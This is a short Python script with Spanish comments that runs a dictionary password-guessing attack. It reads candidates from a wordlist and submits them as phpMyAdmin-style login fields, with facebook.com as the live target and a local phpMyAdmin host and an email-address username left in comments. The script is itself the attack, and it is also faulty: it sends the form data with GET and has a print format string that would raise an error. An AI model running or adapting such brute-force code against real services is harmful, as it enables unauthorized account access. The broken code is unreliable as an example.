# importamos la libraria necesaria para trabajar
import requests

# Abrimos el documento donde tenemos guardado el d icionario
dictionary = open("pass.txt", "r")

usuario = 'ifp' # cabralzay@yahoo.com
url = 'http://httpbin.org/cookies'

# Leemos las palabras de nuestro dicionario

for contra in dictionary:
    # Creamos una variables con los datos de POST
    datos = {
        'pma_username':usuario, # email':usuario
        'pma_password':contra.strip("\n") #  pass':contra.strip("\n")
    }
    #print(datos)

    # Realizamos una peticion

    respuesta = requests.get("http://www.facebook.com", data=datos, allow_redirects=False)
    # respuesta = requests.get("http://192.168.0.104/phpmyadmin/", data=datos, allow_redirects=False)
    print("codigo de respuesta de la pagina web:  " %(respuesta.status_code)) #%s
    #respuesta.url
    #respuesta.status_code

    # Comprobamos el resultado de la conexion se nos devolve un codigo 301 o 302

    #print(respuesta.history[0].status_code)

    if respuesta.status_code in [301, 302]: # if respuesta.history[0].status_code in [301,302]:
        print("Hay combinaciones")
        print(datos)
        break
    else:
        # print("HHH")
        print(datos)
        print(respuesta.status_code)

print("------------------ FINAL ----------------------")


